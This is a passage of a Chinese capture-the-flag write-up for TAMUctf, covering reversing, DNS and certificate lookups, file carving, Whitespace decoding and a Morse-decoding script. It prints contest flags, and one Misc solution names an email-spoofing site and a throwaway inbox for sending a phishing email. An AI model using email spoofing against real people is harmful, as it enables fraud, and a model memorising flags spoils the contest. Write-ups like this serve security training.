-12(%rbp)</span><br><span class="line">&gt; movb$98, -11(%rbp)</span><br><span class="line">&gt; movb$49, -10(%rbp)</span><br><span class="line">&gt; movb$89, -9(%rbp)</span><br><span class="line">&gt; movl$0, -28(%rbp)</span><br><span class="line">&gt; movl$1, -32(%rbp)</span><br><span class="line">&gt; movl$2, -36(%rbp)</span><br><span class="line">&gt; movl-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; movl-28(%rbp), %ecx</span><br><span class="line">&gt; addl-32(%rbp), %ecx</span><br><span class="line">&gt; addl-32(%rbp), %ecx</span><br><span class="line">&gt; addl-32(%rbp), %ecx</span><br><span class="line">&gt; imull%ecx, %eax</span><br><span class="line">&gt; cltd</span><br><span class="line">&gt; movl-60(%rbp), %ecx         ## 4-byte Reload</span><br><span class="line">&gt; idivl%ecx</span><br><span class="line">&gt; movl%eax, -40(%rbp)</span><br><span class="line">&gt; movl-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; movl-28(%rbp), %esi</span><br><span class="line">&gt; addl-32(%rbp), %esi</span><br><span class="line">&gt; addl-32(%rbp), %esi</span><br><span class="line">&gt; imull%esi, %eax</span><br><span class="line">&gt; cltd</span><br><span class="line">&gt; movl-64(%rbp), %esi         ## 4-byte Reload</span><br><span class="line">&gt; idivl%esi</span><br><span class="line">&gt; movl%eax, -44(%rbp)</span><br><span class="line">&gt; movl-40(%rbp), %esi</span><br><span class="line">&gt; movq-56(%rbp), %rdi         ## 8-byte Reload</span><br><span class="line">&gt; movb$0, %al</span><br><span class="line">&gt; callq_printf</span><br><span class="line">&gt; leaqL_.str.1(%rip), %rdi</span><br><span class="line">&gt; movl-44(%rbp), %esi</span><br><span class="line">&gt; movl%eax, -68(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; movb$0, %al</span><br><span class="line">&gt; callq_printf</span><br><span class="line">&gt; leaqL_.str.2(%rip), %rdi</span><br><span class="line">&gt; leaq-16(%rbp), %rsi</span><br><span class="line">&gt; movl%eax, -72(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; movb$0, %al</span><br><span class="line">&gt; callq_printf</span><br><span class="line">&gt; movq___stack_chk_guard@GOTPCREL(%rip), %rsi</span><br><span class="line">&gt; movq(%rsi), %rsi</span><br><span class="line">&gt; movq-8(%rbp), %rdi</span><br><span class="line">&gt; cmpq%rdi, %rsi</span><br><span class="line">&gt; movl%eax, -76(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; jneLBB1_2</span><br><span class="line">&gt; ## %bb.1:</span><br><span class="line">&gt; xorl%eax, %eax</span><br><span class="line">&gt; addq$80, %rsp</span><br><span class="line">&gt; popq%rbp</span><br><span class="line">&gt; retq</span><br><span class="line">&gt; LBB1_2:</span><br><span class="line">&gt; callq___stack_chk_fail</span><br><span class="line">&gt; ud2</span><br><span class="line">&gt; .cfi_endproc</span><br><span class="line">&gt;                                         ## -- End function</span><br><span class="line">&gt; .section__TEXT,__cstring,cstring_literals</span><br><span class="line">&gt; L_.str:                                 ## @.str</span><br><span class="line">&gt; .asciz&quot;The answer: %d\n&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt; L_.str.1:                               ## @.str.1</span><br><span class="line">&gt; .asciz&quot;Maybe it&apos;s this:%d\n&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt; L_.str.2:                               ## @.str.2</span><br><span class="line">&gt; .asciz&quot;gigem&#123;%s&#125;\n&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; .subsections_via_symbols</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>注意到71-78行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"gigem&#123;%s&#125;"</span>%<span class="string">""</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">65</span>,<span class="number">53</span>,<span class="number">53</span>,<span class="number">51</span>,<span class="number">77</span>,<span class="number">98</span>,<span class="number">49</span>,<span class="number">89</span>])</span><br><span class="line"><span class="comment"># gigem&#123;A553Mb1Y&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I?"></a>Who am I?</h2><blockquote><p>What is the A record for <code>tamuctf.com</code>?<br>(Not in standard <code>gigem{flag}</code> format)</p></blockquote><p><code>tamuctf.com</code> 的域名A记录为<code>52.33.57.247</code> ，提交即可。可使用<a href="https://centralops.net/co/NsLookup.aspx" target="_blank" rel="noopener">这个网站</a> 或者命令<code>nslookup -type=all tamuctf.com</code> 。</p><h2 id="Who-do-I-trust"><a href="#Who-do-I-trust" class="headerlink" title="Who do I trust?"></a>Who do I trust?</h2><blockquote><p>Who issued the certificate to <code>tamuctf.com</code>?<br>(Not in standard <code>gigem{flag}</code> format)</p></blockquote><p>查看证书知颁发机构为 <code>Let&#39;s Encrypt Authority X3</code> 。</p><h2 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I?"></a>Where am I?</h2><blockquote><p>What is the name of the city where the server for tamuctf.com is located?</p><p>(Not in standard gigem{flag} format)</p></blockquote><p>使用<a href="https://check-host.net/ip-info?host=tamuctf.com" target="_blank" rel="noopener">在线网站</a> 查询得到服务器所在城市为 <code>Boardman</code> 。</p><h2 id="I-heard-you-like-files"><a href="#I-heard-you-like-files" class="headerlink" title="I heard you like files."></a>I heard you like files.</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$binwalk</span> -e art.png</span><br><span class="line"><span class="variable">$tail</span> -n1  _art.png.extracted/word/media/image1.png | base64 -d</span><br><span class="line">flag&#123;P0lYt@r_D0_y0u_G3t_It_N0w?&#125;</span><br></pre></td></tr></table></figure><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>在页面全选可发现端倪。</p><p><img src="1552784857947.png" alt="1552784857947"></p><p>这是一种由空白字符（空白符、制表符、换行符）组成的<a href="https://en.wikipedia.org/wiki/Whitespace_(programming_language" target="_blank" rel="noopener">编程语言</a>)。这是一个 <a href="https://naokikp.github.io/wsi/whitespace.html" target="_blank" rel="noopener">在线解释器</a> 。</p><p><img src="1552784704688.png" alt="1552784704688"></p><p>flag is <code>gigem{0h_my_wh4t_sp4c1ng_y0u_h4v3}</code> 。</p><h2 id="Onboarding-Checklist"><a href="#Onboarding-Checklist" class="headerlink" title="Onboarding Checklist"></a>Onboarding Checklist</h2><blockquote><p>From: <a href="mailto:importantperson@somebigcorp.com" target="_blank" rel="noopener">importantperson@somebigcorp.com</a><br>Date: Feb 22, 2019 9:00 AM<br>To: <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a><br>Subject: New Employee Access</p><p>Hello Some Guy,</p><p>We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> so they can process the account request?</p><p>Thank you,<br>Important Person</p><p>The new employee can be a little slow to respond.</p><p>Difficulty: easy</p><p>2/26 8:42 am CST: Visting <code>somebigcorp.com</code> is not part of the challenge</p></blockquote><p>按照指示发送钓鱼邮件，接收到flag为<code>gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}</code>。</p><p>工具：<a href="https://emkei.cz/" target="_blank" rel="noopener">伪造邮件</a>，<a href="https://www.guerrillamail.com/" target="_blank" rel="noopener">临时邮箱</a> 。</p><p><img src="1552787841366.png" alt="1552787841366"></p><p><img src="1552787882188.png" alt="1552787882188"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id=""><a href="#" class="headerlink" title="-.-"></a>-.-</h2><blockquote><p>To 1337-H4X0R:</p><p>Our coworker Bob loves a good classical cipher. Unfortunately, he also loves to send everything encrypted with these ciphers. Can you go ahead and decrypt this for me?</p><p>Difficulty: easy</p><p>flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">morse</span><span class="params">(s)</span>:</span></span><br><span class="line">    morseChart = [<span class="string">'.-'</span>,       <span class="string">'-...'</span>,     <span class="string">'-.-.'</span>,     <span class="string">'-..'</span>,      <span class="string">'.'</span>,        <span class="string">'..-.'</span>,     <span class="string">'--.'</span>,</span><br><span class="line">                  <span class="string">'....'</span>,     <span class="string">'..'</span>,       <span class="string">'.---'</span>,     <span class="string">'-.-'</span>,      <span class="string">'.-..'</span>,     <span class="string">'--'</span>,       <span class="string">'-.'</span>,</span><br><span class="line">                  <span class="string">'---'</span>,      <span class="string">'.--.'</span>,     <span class="string">'--.-'</span>,     <span class="string">'.-.'</span>,      <span class="string">'...'</span>,      <span class="string">'-'</span>,        <span class="string">'..-'</span>,</span><br><span class="line">                  <span class="string">'...-'</span>,     <span class="string">'.--'</span>,      <span class="string">'-..-'</span>,     <span class="string">'-.--'</span>,     <span class="string">'--..'</span>,     <span class="string">'-----'</span>,    <span class="string">'.----'</span>,</span><br><span class="line">                  <span class="string">'..---'</span>,    <span class="string">'...--'</span>,    <span class="string">'....-'</span>,    <span class="string">'.....'</span>,    <span class="string">'-....'</span>,    <span class="string">'--...'</span>,    <span class="string">'---..'</span>,</span><br><span class="line">                  <span class="string">'----.'</span>,    <span class="string">'.-.-.-'</span>,   <span class="string">'--..--'</span>,   <span class="string">'..--..'</span>,   <span class="string">'-....-'</span>,   <span class="string">'.----.'</span>,   <span class="string">'---...'</span>,</span><br><span class="line">                  <span class="string">'.-..-.'</span>,   <span class="string">'-..-.'</span>,    <span class="string">'.--.-.'</span>,   <span class="string">'-.-.-.'</span>,   <span class="string">'-...-'</span>,    <span class="string">'-.-.--'</span>,   <span class="string">'..--.-'</span>,</span><br><span class="line">                  <span class="string">'-.--.'</span>,    <span class="string">'-.--.-'</span>,   <span class="string">'...-..-'</span>,  <span class="string">'.-...'</span>,    <span class="string">'.-.-.'</span>,    <span class="string">' '</span>,        <span class="string">'*'</span></span><br><span class="line">                  ]</span><br><span class="line">    alphaChart = [<span class="string">'a'</span>,        <span class="string">'b'</span>,        <span class="string">'c'</span>,        <span class="string">'d'</span>,        <span class="string">'e'</span>,        <span class="string">'f'</span>,        <span class="string">'g'</span>,</span><br><span class="line">                  <span class="string">'h'</span>,        <span class="string">'i'</span>,        <span class="string">'j'</span>,        <span class="string">'k'</span>,        <span class="string">'l'</span>,        <span class="string">'m'</span>,        <span class="string">'n'</span>,</span><br><span class="line">                  <span class="string">'o'</span>,        <span class="string">'p'</span>,        <span class="string">'q'</span>,        <span class="string">'r'</span>,        <span class="string">'s'</span>,        <span class="string">'t'</span>,        <span class="string">'u'</span>,</span><br><span class="line">                  <span class="string">'v'</span>,        <span class="string">'w'</span>,        <span class="string">'x'</span>,        <span class="string">'y'</span>,        <span class="string">'z'</span>,        <span class="string">'0'</span>,        <span class="string">'1'</span>,</span><br><span class="line">                  <span class="string">'2'</span>,        <span class="string">'3'</span>,        <span class="string">'4'</span>,        <span class="string">'5'</span>,        <span class="string">'6'</span>,        <span class="string">'7'</span>,        <span class="string">'8'</span>,</span><br><span class="line">                  <span class="string">'9'</span>,        <span class="string">'.'</span>,        <span class="string">','</span>,        <span class="string">'?'</span>,        <span class="string">'-'</span>,        <span class="string">"'"</span>,        <span class="string">':'</span>,</span><br><span class="line">                  <span class="string">'"'</span>,        <span class="string">'/'</span>,        <span class="string">'@'</span>,        <span class="string">';'</span>,        <span class="string">'='</span>,        <span class="string">'!'</span>,        <span class="string">'_'</span>,</span><br><span class="line">                  <span class="string">'('</span>,        <span class="string">')'</span>,        <span class="string">'$'</span>,        <span class="string">'&amp;'</span>,        <span class="string">'+'</span>,        <span class="string">' '</span>,        <span class="string">'#'</span></span><br><span class="line">                  ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or as a dict -&gt;  &#123;c[1][i]: c[0][i] for i in xrange(len(c[0]))&#125;</span></span><br><span class="line">    c = [morseChart, alphaChart]</span><br><span class="line"></span><br><span class="line">    s = s.lower()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># replace characters not in alphaChart with '#' ,which shall be '*' in</span></span><br><span class="line">    <span class="comment"># encoded string</span></span><br><span class="line">    s = re.sub(<span class="string">'[^a-z0-9.,?\-\':"/@;=!_()$&amp;+ ]'</span>, <span class="string">'#'</span>, s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for convenience sake, I choose not to deal with space in morse.</span></span><br><span class="line">    s = re.sub(<span class="string">'\s+'</span>, <span class="string">' '</span>, s)</span><br><span class="line"></span><br><span class="line">    m = <span class="number">1</span>  <span class="comment"># default to decode</span></span><br><span class="line">    <span class="comment"># if mot mismatch that condition,we are to encode.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">'[^-._ ]'</span>, s):</span><br><span class="line">        <span class="comment"># occasionally we meet [ ._]+ instead of [ .-]+</span></span><br><span class="line">        s = s.replace(<span class="string">'_'</span>, <span class="string">'-'</span>)</span><br><span class="line">        s = re.split(<span class="string">' '</span>, s)</span><br><span class="line">        m = <span class="number">0</span>  <span class="comment"># we are  to encode by morse</span></span><br><span class="line"></span><br><span class="line">    r = []</span><br><span class="line">    <span class="comment"># list().extend(foo) returns None so we use 'or r'</span></span><br><span class="line">    <span class="keyword">return</span> (m * <span class="string">' '</span>).join(r.extend([c[<span class="number">1</span> - m][c[m].index(i)] <span class="keyword">for</span> i <span class="keyword">in</span> s]) <span class="keyword">or</span> r)</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">"dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah 